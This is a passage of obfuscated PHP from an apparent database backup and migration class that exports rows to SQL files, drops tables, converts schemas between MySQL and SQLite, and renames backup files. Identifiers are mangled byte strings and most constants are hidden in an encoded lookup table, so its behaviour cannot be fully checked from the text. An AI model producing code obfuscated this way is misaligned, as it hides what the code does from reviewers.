fopen($Š©Î×Î˜, $_SERVER[€ä¾™²][1179]); $Íø£»ğ = $ÇÍ‚şĞŒ->getPk(); $äêØ£‚­ = $ÇÍ‚şĞŒ->getDbFields(); $•ìÙœ¤ = $_SERVER[€ä¾™²][12]; if ($GLOBALS[$_SERVER[€ä¾™²][891]] && in_array($™Ùù² ø, array($_SERVER[€ä¾™²][1180], $_SERVER[€ä¾™²][1181]))) { $•ìÙœ¤ = $™Ùù² ø; } do { $ÍôİüÚ = array($Íø£»ğ => array($_SERVER[€ä¾™²][1127], $º¿¡±Îş)); $‘Œ¯¡î = $ÇÍ‚şĞŒ->where($ÍôİüÚ)->field($äêØ£‚­)->order($Íø£»ğ . $_SERVER[€ä¾™²][1182])->limit($ìù·šëç)->select(); $‘Œ¯¡î = !empty($‘Œ¯¡î) ? $‘Œ¯¡î : array(); if (!($ñÈ±ç‚ = count($‘Œ¯¡î))) { break; } $ƒ¹ï á = end($‘Œ¯¡î); $º¿¡±Îş = $ƒ¹ï á[$Íø£»ğ]; $¦È…†²ª = array(); foreach ($‘Œ¯¡î as $ÀÃ–‡±) { if ($•ìÙœ¤) { if ($™Ùù² ø == $_SERVER[€ä¾™²][1180]) { if ($ÀÃ–‡±[$_SERVER[€ä¾™²][33]] == $_SERVER[€ä¾™²][1183]) { $·Ú´øŞÚ = json_decode($ÀÃ–‡±[$_SERVER[€ä¾™²][451]], !0); if ($·Ú´øŞÚ[$_SERVER[€ä¾™²][32]] == $GLOBALS[$_SERVER[€ä¾™²][891]] && $·Ú´øŞÚ[$_SERVER[€ä¾™²][850]] != 1) { continue; } } } else { if ($ÀÃ–‡±[$_SERVER[€ä¾™²][33]] == $_SERVER[€ä¾™²][1184] && $ÀÃ–‡±[$_SERVER[€ä¾™²][95]] == $_SERVER[€ä¾™²][887]) { continue; } } } if ($œõ¶Íæá) { $ÀÃ–‡±[$_SERVER[€ä¾™²][87]] = "\x7b\x69\157\72{$œõ¶Íæá}\175" . substr($ÀÃ–‡±[$_SERVER[€ä¾™²][87]], strlen("\173\x69\x6f\x3a{$ÀÃ–‡±[$_SERVER[€ä¾™²][925]]}\175")); $ÀÃ–‡±[$_SERVER[€ä¾™²][925]] = $œõ¶Íæá; } $¦È…†²ª[] = $_SERVER[€ä¾™²][1185] . $this->sqlEncode($ÀÃ–‡±) . $_SERVER[€ä¾™²][1186]; } $ã¢Î¶ÈÔ = "\111\x4e\x53\105\122\x54\40\111\116\x54\x4f\x20\x60{$™Ùù² ø}\140\x20\50\140" . implode($_SERVER[€ä¾™²][1187], $äêØ£‚­) . $_SERVER[€ä¾™²][1188]; fwrite($ÂÛĞµ´û, $ã¢Î¶ÈÔ . implode($_SERVER[€ä¾™²][1189], $¦È…†²ª) . $_SERVER[€ä¾™²][74] . PHP_EOL); $‘¹ğùø› += $ñÈ±ç‚; if ($»Š‘Ÿ») { $»Š‘Ÿ»->update($ñÈ±ç‚); } } while ($ìù·šëç == $ñÈ±ç‚); fclose($ÂÛĞµ´û); return $‘¹ğùø›; } public function sqlToDb($ÛÀ¤¢¢, &$ˆŒüîÙ…) { $¼ßïÉØ =& $_SERVER[€ä¾™²]; $Ä–êÁ¡ï = $this->model()->db(); $—£Ş®ö = @fopen($ÛÀ¤¢¢, $¼ßïÉØ[1190]); if (!$—£Ş®ö) { return !1; } $æâÕ†Ìê = 0; $ÔÇƒÜŸñ = $¼ßïÉØ[12]; $Â…òÆ–  = array(); $‡„Ê·¦¶ = $this->dbType(); $­´˜ÉÛ = $‡„Ê·¦¶ == $¼ßïÉØ[13] ? 500 : 2000; $°†¬£öë = basename($ÛÀ¤¢¢, $¼ßïÉØ[892]); $”âñ‘ğ’ = 0; $íÓÁ”Óœ = 4194304; while (!feof($—£Ş®ö)) { $ÍÜĞâ¶ = trim(fgets($—£Ş®ö)); if (!$ÍÜĞâ¶) { continue; } $áãî»÷³ = $this->sqlDecode($ÍÜĞâ¶, $‡„Ê·¦¶, $°†¬£öë); if (stripos($áãî»÷³, $¼ßïÉØ[431]) === 0) { if (!$ÔÇƒÜŸñ) { $ÔÇƒÜŸñ = $áãî»÷³ . $¼ßïÉØ[53]; } continue; } if ($ˆŒüîÙ…) { $ˆŒüîÙ…->task[$¼ßïÉØ[1175]] += 1; } $æâÕ†Ìê++; $Â…òÆ– [] = rtrim(rtrim(trim($áãî»÷³), $¼ßïÉØ[50]), $¼ßïÉØ[74]); $ˆ™’¹†ª = null; $Ó›«—¼Ï = strlen($áãî»÷³); $”âñ‘ğ’ += $Ó›«—¼Ï; $¤š… Ë = strlen($ÔÇƒÜŸñ) + $”âñ‘ğ’ + (count($Â…òÆ– ) - 1); if ($¤š… Ë >= $íÓÁ”Óœ) { $ˆ™’¹†ª = array_pop($Â…òÆ– ); if ($æâÕ†Ìê > 1) { $æâÕ†Ìê--; } } if ($æâÕ†Ìê >= $­´˜ÉÛ || $ˆ™’¹†ª) { $áãî»÷³ = $ÔÇƒÜŸñ . implode($¼ßïÉØ[50], $Â…òÆ– ); if (!$Ä–êÁ¡ï->execute($áãî»÷³)) { return !1; } if ($ˆŒüîÙ…) { $ˆŒüîÙ…->update($æâÕ†Ìê); } $Â…òÆ–  = array(); $æâÕ†Ìê = 0; $”âñ‘ğ’ = 0; if ($ˆ™’¹†ª) { $Â…òÆ–  = array($ˆ™’¹†ª); $æâÕ†Ìê = 1; $”âñ‘ğ’ = $Ó›«—¼Ï; } } } fclose($—£Ş®ö); if (!empty($Â…òÆ– )) { $áãî»÷³ = $ÔÇƒÜŸñ . implode($¼ßïÉØ[50], $Â…òÆ– ); if (!$Ä–êÁ¡ï->execute($áãî»÷³)) { return !1; } if ($ˆŒüîÙ…) { $ˆŒüîÙ…->update($æâÕ†Ìê); } } return !0; } public function dropTable($ÆÖ çóØ = null) { $š¾¾·Â¬ =& $_SERVER[€ä¾™²]; $ì‘ƒ¬± = $this->model()->db(); $Åà› = $ÆÖ çóØ ? array($ÆÖ çóØ) : $ì‘ƒ¬±->getTables(); if (!$Åà›) { return; } foreach ($Åà› as $ÆÖ çóØ) { if ($ÆÖ çóØ) { $ÆÖ çóØ = strtolower($ÆÖ çóØ); } else { continue; } $ì‘ƒ¬±->execute($š¾¾·Â¬[1191] . $this->escapeName($ÆÖ çóØ) . $š¾¾·Â¬[1192]); } } private function sqlEncode($İ±§Ã¢ˆ) { $´§Ê¨öµ =& $_SERVER[€ä¾™²]; $‚ïã‚º› = array(); foreach ($İ±§Ã¢ˆ as $èØÈ˜³Ú) { if (is_array($èØÈ˜³Ú)) { $èØÈ˜³Ú = json_encode_force($èØÈ˜³Ú); } $èØÈ˜³Ú = addslashes($èØÈ˜³Ú); $èØÈ˜³Ú = str_replace(array($´§Ê¨öµ[1193], $´§Ê¨öµ[286], $´§Ê¨öµ[418]), array($´§Ê¨öµ[1194], $´§Ê¨öµ[1195], $´§Ê¨öµ[1196]), $èØÈ˜³Ú); $‚ïã‚º›[] = $èØÈ˜³Ú; } return $´§Ê¨öµ[58] . implode($´§Ê¨öµ[1197], $‚ïã‚º›) . $´§Ê¨öµ[58]; } private function sqlDecode($ˆò›Êİ‰, $—©Íó”Ø, $¢˜ĞİÂö = '') { $×Á¹„… =& $_SERVER[€ä¾™²]; $ˆò›Êİ‰ = str_replace(array($×Á¹„…[1194], $×Á¹„…[1195], $×Á¹„…[1196]), array($×Á¹„…[1193], $×Á¹„…[286], $×Á¹„…[418]), $ˆò›Êİ‰); if ($—©Íó”Ø == $×Á¹„…[13]) { $ˆò›Êİ‰ = str_ireplace($×Á¹„…[1198], $×Á¹„…[59], $ˆò›Êİ‰); $ˆò›Êİ‰ = stripslashes($ˆò›Êİ‰); } return preg_replace($×Á¹„…[1199], $×Á¹„…[12], $ˆò›Êİ‰); if ($—©Íó”Ø == $×Á¹„…[13]) { return $¢˜ĞİÂö != $×Á¹„…[472] ? stripslashes($ˆò›Êİ‰) : $ˆò›Êİ‰; } if ($¢˜ĞİÂö == $×Á¹„…[472]) { $ˆò›Êİ‰ = str_replace($×Á¹„…[1200], $×Á¹„…[119], stripslashes($ˆò›Êİ‰)); } return $ˆò›Êİ‰; } public function getSqlFile($­®‹·¤« = '') { $ôîúÍè¸ =& $_SERVER[€ä¾™²]; $Â¿¾˜ºŞ = $this->dbType(!0); $«ÌìÌê = CONTROLLER_DIR . "\151\156\163\164\141\x6c\x6c\x2f\x64\141\x74\141\57{$Â¿¾˜ºŞ}\x2e\163\x71\154"; if (!file_exists($«ÌìÌê)) { return !1; } $­¯ÙÒß³ = file_get_contents($«ÌìÌê); $ã¸¼õ©Ã = $ôîúÍè¸[1201] . ($Â¿¾˜ºŞ == $ôîúÍè¸[903] ? $ôîúÍè¸[1202] : $ôîúÍè¸[1203]) . $ôîúÍè¸[1204]; preg_match_all($ã¸¼õ©Ã, $­¯ÙÒß³, $æ»½™Ìˆ); $ŒÅó¦ìğ = $æ»½™Ìˆ[1]; $¬ĞÀˆùš = $this->model()->db(); $È»Ã¢Í = $¬ĞÀˆùš->getTables(); $³œš¬‚ = TEMP_FILES . $ôîúÍè¸[1205] . date($ôîúÍè¸[260]) . $ôîúÍè¸[8]; del_dir($³œš¬‚); mk_dir($³œš¬‚); $’²¨úƒµ = $³œš¬‚ . $ôîúÍè¸[1206]; $ùšÌ©ˆ˜ = $³œš¬‚ . $ôîúÍè¸[1207]; $¹´Êâ–† = $Â¿¾˜ºŞ == $ôîúÍè¸[13] ? $ôîúÍè¸[903] : $ôîúÍè¸[13]; IO::copy(CONTROLLER_DIR . "\x69\156\163\164\141\154\154\x2f\x64\x61\164\141\x2f{$¹´Êâ–†}\56\163\x71\154", $³œš¬‚); @touch($³œš¬‚ . $Â¿¾˜ºŞ . $ôîúÍè¸[892]); $ÛÄÊûó = fopen($’²¨úƒµ, $ôîúÍè¸[1179]); $»ú‹Å¦ = fopen($ùšÌ©ˆ˜, $ôîúÍè¸[1179]); if ($Â¿¾˜ºŞ == $ôîúÍè¸[13]) { $È»Ã¢Í = array_diff($È»Ã¢Í, array($ôîúÍè¸[885], $ôîúÍè¸[886])); $¾ÅßÑ ß = array($ôîúÍè¸[1208], $ôîúÍè¸[1209], $ôîúÍè¸[1210]); fwrite($»ú‹Å¦, implode(PHP_EOL, $¾ÅßÑ ß) . PHP_EOL . PHP_EOL); foreach ($È»Ã¢Í as $éÑÁÒ¹) { $úÒßñäş = $this->sqlFromSqlite($éÑÁÒ¹); if (!$úÒßñäş[$ôîúÍè¸[13]]) { continue; } fwrite($»ú‹Å¦, $úÒßñäş[$ôîúÍè¸[13]] . PHP_EOL . PHP_EOL); if (!in_array($éÑÁÒ¹, $ŒÅó¦ìğ)) { fwrite($ÛÄÊûó, $úÒßñäş[$ôîúÍè¸[903]] . PHP_EOL . PHP_EOL); } } } else { foreach ($È»Ã¢Í as $éÑÁÒ¹) { $úÒßñäş = $this->sqlFromMysql($éÑÁÒ¹); if (!$úÒßñäş[$ôîúÍè¸[903]]) { continue; } fwrite($ÛÄÊûó, $úÒßñäş[$ôîúÍè¸[903]] . PHP_EOL . PHP_EOL); if (!in_array($éÑÁÒ¹, $ŒÅó¦ìğ)) { fwrite($»ú‹Å¦, $úÒßñäş[$ôîúÍè¸[13]] . PHP_EOL . PHP_EOL); } } } fclose($ÛÄÊûó); fclose($»ú‹Å¦); $­¯ÙÒß³ = array($ôîúÍè¸[903] => $’²¨úƒµ, $ôîúÍè¸[13] => $ùšÌ©ˆ˜); return $­®‹·¤« ? $­¯ÙÒß³[$­®‹·¤«] : $­¯ÙÒß³; } public function dbType($¤€‚•Öõ = false) { $ƒöåÃ¤Ü =& $_SERVER[€ä¾™²]; $¿û‘¨À = $¤€‚•Öõ ? $GLOBALS[$ƒöåÃ¤Ü[6]][$ƒöåÃ¤Ü[21]] : $this->database; $¿û‘¨À = array_change_key_case($¿û‘¨À); $°—€ôÖ = $¿û‘¨À[$ƒöåÃ¤Ü[1080]]; if ($°—€ôÖ == $ƒöåÃ¤Ü[1077]) { $íÄÚÖ = explode($ƒöåÃ¤Ü[4], $¿û‘¨À[$ƒöåÃ¤Ü[1086]]); $°—€ôÖ = $íÄÚÖ[0]; } $ÛÎÄĞ’Ö = array($ƒöåÃ¤Ü[1211] => $ƒöåÃ¤Ü[13], $ƒöåÃ¤Ü[1025] => $ƒöåÃ¤Ü[903]); if (isset($ÛÎÄĞ’Ö[$°—€ôÖ])) { $°—€ôÖ = $ÛÎÄĞ’Ö[$°—€ôÖ]; } return $°—€ôÖ; } public function sqlFromMysql($µÕùÚåÀ, $˜ı³‰áâ = '') { $™â‘Ú¤­ =& $_SERVER[€ä¾™²]; $€éÅÄå— = array($™â‘Ú¤­[903] => $™â‘Ú¤­[12], $™â‘Ú¤­[13] => $™â‘Ú¤­[12]); $¹¦Ö”ˆÚ = $this->escapeName($µÕùÚåÀ); $Ø­ÒáÏä = $this->escapeName($µÕùÚåÀ, $™â‘Ú¤­[13]); $†è¢áüõ = $this->model()->db(); $±Ö¤Ë»½ = $†è¢áüõ->query("\163\x68\x6f\167\40\143\162\145\x61\x74\x65\40\x74\x61\x62\x6c\x65\40{$¹¦Ö”ˆÚ}\x3b"); if (!$±Ö¤Ë»½ || !$±Ö¤Ë»½[0]) { return !1; } $ˆä·ˆ„“ = _get($±Ö¤Ë»½[0], $™â‘Ú¤­[1212], $™â‘Ú¤­[12]); if (!$ˆä·ˆ„“) { return !1; } $ºŠ²²ò¿ = "\104\x52\117\120\x20\x54\x41\102\x4c\105\x20\111\106\40\x45\x58\111\123\x54\x53\x20{$¹¦Ö”ˆÚ}\x3b" . PHP_EOL . $ˆä·ˆ„“ . $™â‘Ú¤­[74]; if ($˜ı³‰áâ == $™â‘Ú¤­[903]) { return $ºŠ²²ò¿; } $€éÅÄå—[$™â‘Ú¤­[903]] = $ºŠ²²ò¿; $¡Şè¸ø = array_change_key_case($GLOBALS[$™â‘Ú¤­[6]][$™â‘Ú¤­[21]]); $¬„¬šø = $¡Şè¸ø[$™â‘Ú¤­[1085]]; $ÉøÔ§Öë = $™â‘Ú¤­[1213] . $¬„¬šø . "\47\x20\x41\116\x44\40\124\x41\102\114\105\x5f\x4e\101\115\x45\x20\75\x20{$Ø­ÒáÏä}\73"; $´³—öçû = "\x53\110\117\x57\40\x49\x4e\104\105\130\40\106\x52\x4f\x4d\x20{$¹¦Ö”ˆÚ}\x3b"; $ÑÍ†»Ö = $†è¢áüõ->query($ÉøÔ§Öë); if (empty($ÑÍ†»Ö)) { return $˜ı³‰áâ ? $€éÅÄå—[$˜ı³‰áâ] : $€éÅÄå—; } $ûõÅÉüô = $†è¢áüõ->query($´³—öçû); $ºô‰·ıá = $™â‘Ú¤­[12]; $©¾¨æ´Ş = array(); foreach ($ûõÅÉüô as $Ñí‹Á) { if (!$ºô‰·ıá && $Ñí‹Á[$™â‘Ú¤­[1214]] == $™â‘Ú¤­[1215]) { $ºô‰·ıá = $Ñí‹Á[$™â‘Ú¤­[1216]]; } if (isset($©¾¨æ´Ş[$Ñí‹Á[$™â‘Ú¤­[1214]]])) { $©¾¨æ´Ş[$Ñí‹Á[$™â‘Ú¤­[1214]]][$™â‘Ú¤­[1217]][] = $Ñí‹Á[$™â‘Ú¤­[1216]]; continue; } $©¾¨æ´Ş[$Ñí‹Á[$™â‘Ú¤­[1214]]] = array($™â‘Ú¤­[1218] => $Ñí‹Á[$™â‘Ú¤­[1214]], $™â‘Ú¤­[1217] => array($Ñí‹Á[$™â‘Ú¤­[1216]]), $™â‘Ú¤­[1219] => $Ñí‹Á[$™â‘Ú¤­[1220]] == $™â‘Ú¤­[91] ? 0 : 1); } $°Å¦âÂİ = array(); foreach ($©¾¨æ´Ş as $Ñí‹Á) { $ûÍôÙ’ = $Ñí‹Á[$™â‘Ú¤­[1218]] == $™â‘Ú¤­[1215]; $ñ…ñÚı = $Ñí‹Á[$™â‘Ú¤­[1219]] == $™â‘Ú¤­[91] && !$ûÍôÙ’ ? $™â‘Ú¤­[1221] : $™â‘Ú¤­[12]; $Ë‘ÛşÌì = $™â‘Ú¤­[1222] . $µÕùÚåÀ . $™â‘Ú¤­[11] . ($ûÍôÙ’ ? $™â‘Ú¤­[1223] : $Ñí‹Á[$™â‘Ú¤­[1218]]); $È¥ÂÖˆ˜ = $™â‘Ú¤­[1224] . implode($™â‘Ú¤­[1225], $Ñí‹Á[$™â‘Ú¤­[1217]]) . $™â‘Ú¤­[1226]; $°Å¦âÂİ[] = sprintf($™â‘Ú¤­[1227], $™â‘Ú¤­[1228], $ñ…ñÚı, $™â‘Ú¤­[1229], $Ë‘ÛşÌì, $™â‘Ú¤­[1230], $µÕùÚåÀ, $È¥ÂÖˆ˜); } $š–ú©ÀŸ = array(); $÷¤ÃàŒª = array($™â‘Ú¤­[1231] => $™â‘Ú¤­[391], $™â‘Ú¤­[1232] => $™â‘Ú¤­[391], $™â‘Ú¤­[365] => $™â‘Ú¤­[391], $™â‘Ú¤­[364] => $™â‘Ú¤­[391], $™â‘Ú¤­[1233] => $™â‘Ú¤­[1234], $™â‘Ú¤­[1235] => $™â‘Ú¤­[1234], $™â‘Ú¤­[1234] => $™â‘Ú¤­[1234], $™â‘Ú¤­[1236] => $™â‘Ú¤­[1234], $™â‘Ú¤­[283] => $™â‘Ú¤­[1234], $™â‘Ú¤­[1237] => $™â‘Ú¤­[1234], $™â‘Ú¤­[1238] => $™â‘Ú¤­[1234], $™â‘Ú¤­[1239] => $™â‘Ú¤­[1240], $™â‘Ú¤­[366] => $™â‘Ú¤­[1240], $™â‘Ú¤­[367] => $™â‘Ú¤­[1240], $™â‘Ú¤­[1241] => $™â‘Ú¤­[1241]); foreach ($ÑÍ†»Ö as $Ñí‹Á) { $˜ı³‰áâ = _get($÷¤ÃàŒª, $Ñí‹Á[$™â‘Ú¤­[1242]], $Ñí‹Á[$™â‘Ú¤­[1243]]); $ÔÖãßƒ‹ = $Ñí‹Á[$™â‘Ú¤­[1244]] == $™â‘Ú¤­[1008] ? $™â‘Ú¤­[1245] : $™â‘Ú¤­[1246]; $ŠâÁú½‰ = $Ñí‹Á[$™â‘Ú¤­[1247]] == $ºô‰·ıá ? $™â‘Ú¤­[1248] : $™â‘Ú¤­[12]; $‹ğø€Š = $Ñí‹Á[$™â‘Ú¤­[1062]] ? strtoupper(str_replace($™â‘Ú¤­[11], $™â‘Ú¤­[12], $Ñí‹Á[$™â‘Ú¤­[1062]])) : $™â‘Ú¤­[12]; $š–ú©ÀŸ[] = sprintf($™â‘Ú¤­[1249], $Ñí‹Á[$™â‘Ú¤­[1247]], $˜ı³‰áâ, $ÔÖãßƒ‹, $ŠâÁú½‰, $‹ğø€Š); } $ …±–ğ = array("\104\122\117\x50\x20\x54\101\102\114\105\40\x49\106\40\x45\x58\111\x53\124\123\40{$Ø­ÒáÏä}\73", "\x43\122\x45\101\x54\x45\40\124\101\x42\114\105\x20{$Ø­ÒáÏä}\40\50", implode($™â‘Ú¤­[50] . PHP_EOL, $š–ú©ÀŸ), $™â‘Ú¤­[1250]); $é»ØÚßò = implode(PHP_EOL, array_merge($ …±–ğ, $°Å¦âÂİ)); if ($˜ı³‰áâ == $™â‘Ú¤­[13]) { return $é»ØÚßò; } $€éÅÄå—[$™â‘Ú¤­[13]] = $é»ØÚßò; return $€éÅÄå—; } public function sqlFromSqlite($œ¨ôŞß­, $œÖŒ£×ó = '') { $’îá‚ =& $_SERVER[€ä¾™²]; $“¹ıñ­Á = array($’îá‚[903] => $’îá‚[12], $’îá‚[13] => $’îá‚[12]); $Šó’œÇ = $this->escapeName($œ¨ôŞß­); $ü¹ˆ¤ç± = $this->escapeName($œ¨ôŞß­, $’îá‚[13]); $§¤°¿÷ = $this->model()->db(); $×óªº = "\120\122\101\x47\115\x41\x20\x54\x41\x42\x4c\x45\137\111\116\106\117\40\x28\47{$œ¨ôŞß­}\x27\x29"; $¸Â‹¼ÀÃ = "\x53\105\114\x45\x43\x54\40\52\x20\x46\122\117\115\40\x73\x71\x6c\151\x74\x65\x5f\x6d\141\x73\x74\x65\x72\x20\x57\x48\105\x52\x45\40\164\x62\x6c\x5f\x6e\141\x6d\145\x20\x3d\x20\47{$œ¨ôŞß­}\47"; $£ª°ÕÙŸ = $§¤°¿÷->query($×óªº); if (empty($£ª°ÕÙŸ)) { return $œÖŒ£×ó ? $“¹ıñ­Á[$œÖŒ£×ó] : $“¹ıñ­Á; } $ËƒÊúõˆ = $§¤°¿÷->query($¸Â‹¼ÀÃ); $Î–•¡ùã = $Ë¤Ş¬Ş· = array(); foreach ($ËƒÊúõˆ as $ğşÁÆ’) { if ($ğşÁÆ’[$’îá‚[33]] == $’îá‚[358]) { $Î–•¡ùã[] = $ğşÁÆ’[$’îá‚[1251]]; } else { $Ë¤Ş¬Ş·[] = $ğşÁÆ’[$’îá‚[1251]]; } } $ó±Ÿš» = array_merge(array("\104\x52\x4f\x50\40\x54\x41\102\x4c\x45\40\x49\x46\x20\105\130\x49\123\x54\123\40{$ü¹ˆ¤ç±}\x3b"), $Î–•¡ùã, $Ë¤Ş¬Ş·); $ó±Ÿš» = implode($’îá‚[74] . PHP_EOL, $ó±Ÿš») . $’îá‚[74]; if ($œÖŒ£×ó == $’îá‚[13]) { return $ó±Ÿš»; } $“¹ıñ­Á[$’îá‚[13]] = $ó±Ÿš»; $ıøôãÑˆ = $·Ò“èÖø = array(); $İ¤‡» = array(); $¯ßÇ³´Î = array(); foreach ($ËƒÊúõˆ as $ğşÁÆ’) { if ($ğşÁÆ’[$’îá‚[33]] == $’îá‚[1252]) { $êÇÚ¿½¨ = $ğşÁÆ’[$’îá‚[1251]]; $äµÅäâ = stripos($êÇÚ¿½¨, $’îá‚[1221]) !== !1; $¾Ö¶‘ø› = stripos($êÇÚ¿½¨, $’îá‚[1215]) !== !1; preg_match($’îá‚[1253], $êÇÚ¿½¨, $»Ï‘şÇ¸); if (empty($»Ï‘şÇ¸)) { continue; } $’ë‹Ù§â = array_map($’îá‚[1254], explode($’îá‚[50], $»Ï‘şÇ¸[1])); $Ñú¦ª®Õ = array(); foreach ($’ë‹Ù§â as $¶Á¯¬) { $•Á—ˆ´Ü = trim($¶Á¯¬, $’îá‚[1255]); $Ñú¦ª®Õ[] = $•Á—ˆ´Ü; $İ¤‡»[$•Á—ˆ´Ü] = !0; } $¯ßÇ³´Î[] = array($’îá‚[32] => $ğşÁÆ’[$’îá‚[32]], $’îá‚[1251] => $êÇÚ¿½¨, $’îá‚[1256] => $äµÅäâ, $’îá‚[1257] => $¾Ö¶‘ø›, $’îá‚[1258] => $Ñú¦ª®Õ); } } $â”ÑúÇ = array($’îá‚[1232] => $’îá‚[1232], $’îá‚[391] => $’îá‚[1259], $’îá‚[1240] => $’îá‚[1260], $’îá‚[1234] => $’îá‚[1234], $’îá‚[1241] => $’îá‚[1261], $’îá‚[1262] => $’îá‚[1263]); $¿µáÀ†Ä = array($’îá‚[451], $’îá‚[169], $’îá‚[547]); $İîÜ°¼æ = array($’îá‚[391], $’îá‚[1240], $’îá‚[1262], $’îá‚[1232]); foreach ($£ª°ÕÙŸ as $ğşÁÆ’) { $êàïë—ü = $ğşÁÆ’[$’îá‚[32]]; $âæÍ¯¶÷ = strtolower($ğşÁÆ’[$’îá‚[33]]); if ($âæÍ¯¶÷ == $’îá‚[1234] && isset($İ¤‡»[$êàïë—ü])) { $œÖŒ£×ó = in_array($êàïë—ü, $¿µáÀ†Ä) ? $’îá‚[1234] : $’îá‚[1264]; } else { $œÖŒ£×ó = _get($â”ÑúÇ, $âæÍ¯¶÷, $âæÍ¯¶÷); } if ($ğşÁÆ’[$’îá‚[57]] > 0) { $·Ò“èÖø[$ğşÁÆ’[$’îá‚[57]]] = $êàïë—ü; } $ŸÈ™ÆÔ = $’îá‚[12]; if ($ğşÁÆ’[$’îá‚[56]] !== null) { $şæŒâ¾ğ = $ğşÁÆ’[$’îá‚[56]]; if (in_array($âæÍ¯¶÷, $İîÜ°¼æ) && is_numeric($şæŒâ¾ğ)) { $ŸÈ™ÆÔ = "\104\105\x46\101\125\114\x54\40{$şæŒâ¾ğ}"; } else { if (strtolower($şæŒâ¾ğ) === $’îá‚[104]) { $ŸÈ™ÆÔ = $ğşÁÆ’[$’îá‚[35]] ? $’îá‚[12] : $’îá‚[1246]; } else { $ØÂÄŠáÖ = is_numeric($şæŒâ¾ğ) ? $şæŒâ¾ğ : $’îá‚[58] . addslashes($şæŒâ¾ğ) . $’îá‚[58]; $ŸÈ™ÆÔ = "\x44\x45\x46\x41\x55\114\x54\40{$ØÂÄŠáÖ}"; } } } $°±‹¾‚ = $ğşÁÆ’[$’îá‚[35]] ? $’îá‚[1245] : $’îá‚[1265]; $ëé”œ¹ = stripos($âæÍ¯¶÷, $’îá‚[365]) !== !1 && $ğşÁÆ’[$’îá‚[57]] ? $’îá‚[1266] : $’îá‚[12]; $ıøôãÑˆ[] = sprintf($’îá‚[1267], $êàïë—ü, $œÖŒ£×ó, $°±‹¾‚, $ŸÈ™ÆÔ, $ëé”œ¹); } if (!empty($·Ò“èÖø)) { ksort($·Ò“èÖø); $²Ö–—œ¿ = $’îá‚[475] . implode($’îá‚[1187], $·Ò“èÖø) . $’îá‚[475]; $ıøôãÑˆ[] = "\120\x52\111\115\101\x52\x59\40\113\x45\x59\x20\x28{$²Ö–—œ¿}\51"; } foreach ($¯ßÇ³´Î as $àâÓ£‘Ò) { if ($àâÓ£‘Ò[$’îá‚[1257]]) { continue; } $îüÅç„æ = array(); foreach ($àâÓ£‘Ò[$’îá‚[1258]] as $¶Á¯¬) { $â”ÑúÇ = null; foreach ($£ª°ÕÙŸ as $êøøÉÍı) { if ($êøøÉÍı[$’îá‚[32]] == $¶Á¯¬) { $â”ÑúÇ = strtolower($êøøÉÍı[$’îá‚[33]]); break; } } if ($â”ÑúÇ == $’îá‚[1234] && in_array($¶Á¯¬, $¿µáÀ†Ä)) { $îüÅç„æ[] = "\x60{$¶Á¯¬}\x60\50\x32\x35\60\51"; } else { $îüÅç„æ[] = "\140{$¶Á¯¬}\140"; } } $âæÍ¯¶÷ = ($àâÓ£‘Ò[$’îá‚[1256]] ? $’îá‚[1268] : $’îá‚[12]) . $’îá‚[1269]; $š•ĞÓ× = str_replace($’îá‚[1222] . $œ¨ôŞß­ . $’îá‚[11], $’îá‚[12], $àâÓ£‘Ò[$’îá‚[32]]); $š•ĞÓ× = str_replace($œ¨ôŞß­ . $’îá‚[11], $’îá‚[12], $š•ĞÓ×); $ıøôãÑˆ[] = "{$âæÍ¯¶÷}\40\x60{$š•ĞÓ×}\140\40\x28" . implode($’îá‚[50], $îüÅç„æ) . $’îá‚[1186]; } $º®ë¢¸¬ = array("\x44\x52\x4f\120\40\x54\101\x42\114\x45\x20\x49\106\x20\x45\x58\x49\x53\124\123\x20{$Šó’œÇ}\x3b", "\103\122\105\101\x54\105\40\124\101\102\x4c\105\x20{$Šó’œÇ}\40\50", implode($’îá‚[50] . PHP_EOL, $ıøôãÑˆ), $’îá‚[1270]); $º®ë¢¸¬ = implode(PHP_EOL, $º®ë¢¸¬); if ($œÖŒ£×ó == $’îá‚[903]) { return $º®ë¢¸¬; } $“¹ıñ­Á[$’îá‚[903]] = $º®ë¢¸¬; return $“¹ıñ­Á; } private function escapeName($¡éşï…, $ßå›‹‚Š = "\x6d\171\163\161\154") { $Ç‘„­×¡ =& $_SERVER[€ä¾™²]; $¡éşï… = preg_replace($Ç‘„­×¡[1271], $Ç‘„­×¡[12], $¡éşï…); if ($ßå›‹‚Š === $Ç‘„­×¡[903]) { return "\x60{$¡éşï…}\x60"; } return "\x22{$¡éşï…}\x22"; } public function mixBakList($İŠŸÍßê) { $öğ²ë¡ı =& $_SERVER[€ä¾™²]; $İŠŸÍßê = rtrim($İŠŸÍßê, $öğ²ë¡ı[8]) . $öğ²ë¡ı[8]; $“îÁìô§ = $öğ²ë¡ı[1272]; $ôùµ°µÍ = IO::listPath($İŠŸÍßê); if (empty($ôùµ°µÍ[$öğ²ë¡ı[86]])) { return !1; } $¾ÁšÌ– = array(); foreach ($ôùµ°µÍ[$öğ²ë¡ı[86]] as $Ùãè“èï => $ù¸ö£½) { if (!$ù¸ö£½[$öğ²ë¡ı[32]] || !$ù¸ö£½[$öğ²ë¡ı[87]]) { continue; } $õ£Á°¦˜ = Mcrypt::encode($ù¸ö£½[$öğ²ë¡ı[32]], $“îÁìô§); $Œ•®¡İÒ = md5($õ£Á°¦˜); IO::rename($ù¸ö£½[$öğ²ë¡ı[87]], $Œ•®¡İÒ); $¾ÁšÌ–[$Œ•®¡İÒ] = $õ£Á°¦˜; } $·úú¹Ä = md5($öğ²ë¡ı[1273] . $“îÁìô§); IO::setContent($İŠŸÍßê . $·úú¹Ä, json_encode($¾ÁšÌ–)); return !0; } public function unmixBakList($øĞ¸…·Ï) { $¡öíŞï„ =& $_SERVER[€ä¾™²]; $øĞ¸…·Ï = rtrim($øĞ¸…·Ï, $¡öíŞï„[8]) . $¡öíŞï„[8]; $Àà§ òÓ = $this->unmixBakListGet($øĞ¸…·Ï, !0); if (empty($Àà§ òÓ)) { return !1; } foreach ($Àà§ òÓ as $¡•ÌâàÒ => $å¸ç—òÇ) { $İŞ…îÓç = IO::rename($øĞ¸…·Ï . $å¸ç—òÇ, $¡•ÌâàÒ); if (!$İŞ…îÓç) { return !1; } } return !0; } public function unmixBakListGet($ô²È£½, $Ùñ·í± = false) { $Ãå¹ìª =& $_SERVER[€ä¾™²]; $ô²È£½ = rtrim($ô²È£½, $Ãå¹ìª[8]) . $Ãå¹ìª[8]; $Æøü™¤ß = $Ãå¹ìª[1272]; $œ§ş£š¾ = md5($Ãå¹ìª[1273] . $Æøü™¤ß); $ü ›°Ï¢ = $ô²È£½ . $œ§ş£š¾; if 